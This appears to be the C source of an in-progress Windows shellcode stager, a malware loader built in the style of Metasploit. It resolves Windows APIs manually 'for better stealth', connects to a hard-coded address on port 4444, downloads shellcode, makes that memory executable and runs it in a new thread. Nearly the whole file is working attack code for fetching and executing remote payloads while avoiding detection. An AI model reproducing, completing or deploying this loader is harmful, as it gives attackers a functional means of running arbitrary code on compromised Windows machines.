/* TODO:
 * https://github.com/rapid7/metasploit-framework/tree/master/data/headers/windows
 * https://github.com/rapid7/metasploit-framework/tree/master/data/templates/src/pe
 * https://github.com/rapid7/metasploit-framework/tree/master/external/source/shellcode/windows
 *
 * https://github.com/rapid7/metasploit-framework/tree/master/data/utilities/encrypted_payload
 *
 *
 * x86_64-w64-mingw32-gcc -nostdlib -nostartfiles -s -Wl,--entry=main -Wl,--strip-all stager.c -o stager.exe
 * 
 * // Working flags below, 5/72
 * x86_64-w64-mingw32-gcc -s -Wl,--entry=main -Wl,--strip-all stager.c -o stager.exe -lws2_32
 * */

// TODO: eventually convert to c code then asm then shell code?

//#include "stager.h"

//#include <winsock2.h> // needed by socket and connect?
#include "../utils/winsock_util.h"
//#include "payload_util.h"
#include "../utils/utils.h"
#include "../utils/kernel32_util.h"
#include "../utils/ntdll_util.h"

//#include <stdio.h>
//#include <stdlib.h>

// TODO: GetProcAddress is not working... fix it


#pragma comment(lib, "ws2_32.lib")

//bool Stager::run(const std::string& host, const std::string& port)
int run(const char* host, const char* port)
{
    // 1. manually resolve apis

    /*
    TODO: 
    would i be more effient to find the function/procedure names all at once for a single dll/module so i don't have 
    to loop through the array of functions every single time?

    something like this:
    resolve_all_functions(dll_base, hashes, pointers, count);

    not sure if this is worth doing for dlls/modules tho
    
    */

	// TODO: hash these string literals 
    FuncVirtualAlloc pVirtualAlloc = (FuncVirtualAlloc)GetProcAddressManual("kernel32.dll", "VirtualAlloc");
    FuncVirtualProtect pVirtualProtect = (FuncVirtualProtect)GetProcAddressManual("kernel32.dll", "VirtualProtect");
    FuncCreateThread pCreateThread = (FuncCreateThread)GetProcAddressManual("kernel32.dll", "CreateThread");
	FuncWaitForSingleObject pWaitForSingleObject = (FuncWaitForSingleObject)GetProcAddressManual("kernel32.dll", "WaitForSingleObject");
    FuncLdrLoadDll pLdrLoadDll = (FuncLdrLoadDll)GetProcAddressManual("ntdll.dll", "LdrLoadDll");

	// RtlInitUnicodeString(&usDllName, L"ws2_32.dll");
    // NOTE: use stack allocation instead of RtlInitUnicodeString for better stealth
    UNICODE_STRING usDllName;
    usDllName.Length = 20;
    usDllName.MaximumLength = 22;
    usDllName.Buffer = L"ws2_32.dll";
    PVOID dllBase; // ws2_32.dll pModule
    NTSTATUS status = pLdrLoadDll(NULL, NULL, &usDllName, &dllBase);
    // TODO: for now we just assume it's always successful
    //if (!NT_SUCCESS(status))
    if (status == 0)
	{
        printf("status = %d\n", status);
		printf("pLdrLoadDll was unable to obtain valid dllBase\n");
	}

    printf("start\n");
    FuncWSAStartup pWSAStartup = (FuncWSAStartup)GetProcAddressManualM(dllBase, "WSAStartup");
    printf("start2\n");
    FuncWSACleanup pWSACleanup = (FuncWSACleanup)GetProcAddressManualM(dllBase, "WSACleanup");
    FuncGetAddrInfo pGetAddrInfo = (FuncGetAddrInfo)GetProcAddressManualM(dllBase, "getaddrinfo");
    FuncFreeAddrInfo pFreeAddrInfo = (FuncFreeAddrInfo)GetProcAddressManualM(dllBase, "freeaddrinfo");
    FuncSocket pSocket = (FuncSocket)GetProcAddressManualM(dllBase, "socket");
    FuncCloseSocket pCloseSocket = (FuncCloseSocket)GetProcAddressManualM(dllBase, "closesocket");
    FuncConnect pConnect = (FuncConnect)GetProcAddressManualM(dllBase, "connect");
    //FuncSend pSend = (FuncSend)GetProcAddressManual("ws2_32.dll", "send");
    FuncRecv pRecv = (FuncRecv)GetProcAddressManualM(dllBase, "recv");

    //std::cout << "1 - Starting" << std::endl;
	// printf("1 - Starting\n");
    
    WSADATA wsaData;
    if (pWSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        //std::cout << "WSAStartup failed" << std::endl;
        // printf("WSAStartup failed\n");
        return 1;
    }

    SOCKET sock = pSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) 
	{
        //std::cout << "socket failed: " << WSAGetLastError() << std::endl;
		// printf("socket failed: %d\n", WSAGetLastError());
        return 1;
    }

    //std::cout << "2 - Socket created" << std::endl;
    // printf("2 - Socket created\n"); 

    //ADDRINFOA hints, *result = nullptr;
    //ZeroMemory(&hints, sizeof(hints));
	ADDRINFOA hints = {0};
	ADDRINFOA* result = NULL;


    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    //if (getaddrinfo(host.c_str(), port.c_str(), &hints, &result) != 0) 
    if (pGetAddrInfo(host, port, &hints, &result) != 0) 
	{
        //std::cout << "getaddrinfo failed" << std::endl;
		// printf("getaddrinfo failed\n");
        return 1;
    }

    //std::cout << "3 - Address resolved" << std::endl;
    // printf("3 - Address resolved\n");

    /*
    int connected = 0;
    for (auto ptr = result; ptr != nullptr; ptr = ptr->ai_next) 
	{
        if (pConnect(sock, ptr->ai_addr, (int)ptr->ai_addrlen) == 0) 
		{
            connected = 1;
            break;
        }
    }
    pFreeAddrInfo(result);
    */

    int connected = 0;
    ADDRINFOA *ptr = result; // TODO: no need to assign result to ptr just use result?
    while (ptr != NULL)
    {
        if (pConnect(sock, ptr->ai_addr, (int)ptr->ai_addrlen) == 0)
        {
            connected = 1;
            break;
        }
        ptr = ptr->ai_next;
    }
    pFreeAddrInfo(result);

    if (!connected) 
	{
        //std::cout << "connect failed" << std::endl;
        // printf("connect failed\n");
        return 1;
    }

    // 2.
    //std::cout << "4 - Connected" << std::endl;
    // printf("4 - Connected\n");

    // 3. 
    //std::vector<unsigned char> shellcode(4096);
    //int bytes_received = recv(sock, (char*)shellcode.data(), shellcode.size(), 0);

	unsigned char shellcode[512];
	//int bytes_received = recv(sock, (char*)shellcode, sizeof(shellcode), 0);
	int bytes_received = pRecv(sock, (char*)shellcode, 512, 0);
    
    if (bytes_received <= 0) 
	{
        //std::cout << "recv failed, received: " << bytes_received << std::endl;
        // printf("recv failed, received: %d\n", bytes_received);
        return 1;
    }

    //std::cout << "5 - Received " << bytes_received << " bytes" << std::endl;
    // printf("5 - Received %d bytes\n", bytes_received);

    LPVOID beacon_mem = pVirtualAlloc(0, bytes_received, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!beacon_mem) // TODO: checking if it is NULL would be more correct?
	{
        //std::cout << "VirtualAlloc failed: " << GetLastError() << std::endl;
        // printf("VirtualAlloc failed: %d\n", GetLastError());
        return 1;
    }

    // memcpy(beacon_mem, shellcode, bytes_received);
	// TODO: copy 8 bytes at a time, and then copy left over
	for (int i = 0; i < bytes_received; ++i)
	{
		((char *)beacon_mem)[i] = shellcode[i];
	}

    // EXECUTE_READ.
    DWORD old_prot;
    // NOTE: virtualProtect is also being called somewhere in the windows api
    if (pVirtualProtect(beacon_mem, bytes_received, PAGE_EXECUTE_READ, &old_prot) == FALSE) 
    {
        // Fail silently if we cannot make the memory executable.
        return 1;
    }

    //std::cout << "6 - Memory allocated and copied" << std::endl;
    // printf("6 - Memory allocated and copied");

    // 4.
    //HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)beacon_mem, NULL, 0, NULL);
    HANDLE thread = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)beacon_mem, NULL, 0, NULL);
    if (!thread) 
	{
        //std::cout << "CreateThread failed: " << GetLastError() << std::endl;
        // printf("CreateThread failed: %d\n", GetLastError());
        return 1;
    }

    //std::cout << "7 - Thread created, waiting..." << std::endl;
    // printf("7 - Thread created, waiting..."); 
    pWaitForSingleObject(thread, INFINITE); // Wait for thread to complete

    //std::cout << "8 - Cleaning up" << std::endl;
    // printf("8 - Cleaning up"); 
    pCloseSocket(sock);
    pWSACleanup();
    return 0;
}

int main()
{
    //Stager tcpStager;
    //tcpStager.run("172.18.245.234", "4444");
    //tcpStager.run("10.0.0.86", "4444");
    run("172.18.245.234", "4444");
    //run("10.0.0.86", "4444");
}



